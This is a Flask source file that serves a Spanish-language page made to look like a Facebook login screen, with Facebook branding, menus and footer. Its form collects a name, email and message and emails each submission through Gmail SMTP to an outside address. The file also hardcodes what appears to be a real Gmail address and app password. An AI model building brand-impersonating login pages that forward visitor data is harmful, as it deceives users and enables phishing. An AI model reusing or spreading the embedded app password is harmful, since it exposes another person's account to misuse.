from flask import Flask, request, render_template_string
import smtplib
from email.message import EmailMessage

app = Flask(__name__)

SMTP_USER = "kenyaportout@gmail.com"
SMTP_APP_PASSWORD = "ogltkxnbfltyitft"
SMTP_TO = "yrivera@americana.edu.co"

form_html = """
<!doctype html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Facebook – Iniciar sesión o Registrarse</title>
  <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
</head>
<body>
  <!-- Barra superior estilo Facebook -->
  <header class="fb-header">
    <div class="fb-header-left">
      <img src="{{ url_for('static', filename='img/fb_logo.png') }}" alt="Facebook" class="fb-logo">
    </div>
    <div class="fb-header-center">
      <input type="text" placeholder="Buscar en Facebook" class="fb-search">
    </div>
    <div class="fb-header-right">
      <a href="#" class="fb-link">Inicio</a>
      <a href="#" class="fb-link">Amigos</a>
      <a href="#" class="fb-link">Watch</a>
      <a href="#" class="fb-link">Marketplace</a>
    </div>
  </header>

  <!-- Contenedor principal -->
  <main class="fb-main">
    <section class="fb-left">
      <ul class="fb-menu">
        <li><a href="#">Noticias</a></li>
        <li><a href="#">Messenger</a></li>
        <li><a href="#">Videos</a></li>
        <li><a href="#">Grupos</a></li>
        <li><a href="#">Juegos</a></li>
      </ul>
    </section>

    <section class="fb-center">
      <!-- Formulario que envía a /send -->
      <div class="fb-login-card">
        <h2>Inicia sesión en Facebook</h2>
        <form method="POST" action="/send">
          <label>Nombre:</label><br>
          <input type="text" name="name" required><br><br>
          <label>Correo:</label><br>
          <input type="email" name="email" required><br><br>
          <label>Mensaje:</label><br>
          <textarea name="message" required></textarea><br><br>
          <button type="submit" class="fb-btn">Enviar</button>
        </form>
      </div>
    </section>

    <section class="fb-right">
      <h3>Contactos</h3>
      <p>Amigos sugeridos, eventos, anuncios…</p>
    </section>
  </main>

  <footer class="fb-footer">
    © 2026 Facebook – Todos los derechos reservados.
  </footer>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(form_html)

@app.route("/send", methods=["POST"])
def send():
    name = request.form.get("name", "").strip()
    email = request.form.get("email", "").strip()
    message = request.form.get("message", "").strip()

    msg = EmailMessage()
    msg["Subject"] = "Nuevo mensaje desde Flask"
    msg["From"] = SMTP_USER
    msg["To"] = SMTP_TO
    msg.set_content(
        f"Nombre: {name}\n"
        f"Correo: {email}\n\n"
        f"Mensaje:\n{message}"
    )

    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(SMTP_USER, SMTP_APP_PASSWORD)
            server.send_message(msg)
        return "<h3>Mensaje enviado correctamente.</h3>"
    except Exception as e:
        return f"<h3>Error enviando el mensaje: {e}</h3>", 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
